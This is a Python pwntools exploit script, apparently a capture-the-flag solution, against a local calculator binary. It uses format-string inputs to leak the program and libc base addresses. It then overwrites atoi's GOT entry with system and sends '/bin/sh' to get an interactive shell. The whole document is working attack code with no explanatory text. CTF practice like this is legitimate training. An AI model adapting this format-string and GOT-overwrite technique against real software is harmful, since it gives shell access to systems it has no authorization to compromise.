from pwn import *
import sys
sys.path.append('/media/sf_F_DRIVE/Research/lib')
from Mix import *


ctrOffset = 37

p = process("./pwn1_4bee342a05a1242e9aceaca77417d2ac")
context.clear(arch='amd64')
e = ELF("pwn1_4bee342a05a1242e9aceaca77417d2ac")

l = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

def input(a, b, c):
    p.recvuntil(" Operator: ")
    p.send(a)
    p.recvuntil("Operand 1: ")
    p.send(b)
    p.recvuntil("Operand 2: ")
    p.send(c)
    
input('+AAAAAAA%31$pBBBB', 'b', 'c')
p.recvuntil('Operation: +AAAAAAA')
leak = p.recvuntil("BBBB")[:-4]
e.address = int(leak, 16) - 0xdf8
log.info(hex(e.address))
input('+AAAAAAA%87$pBBBB', 'b', 'c')
p.recvuntil('Operation: +AAAAAAA')
leak = p.recvuntil("BBBB")[:-4]
l.address = int(leak, 16) - l.symbols['__libc_start_main'] - 240
log.info(hex(l.address))
log.info('system: '+hex(l.symbols["system"]))

sStr = p64(l.symbols["system"])

atoiGOT = e.address + 0x202058
fmt = genFmtStr(37, {atoiGOT: sStr[:4]}, writtenLen=8)
print len(fmt)
log.info('fmt str: '+str([fmt]))
raw_input('>')
input('+AAAAAAA'+fmt, '/bin/sh\x00', '3')

p.interactive()

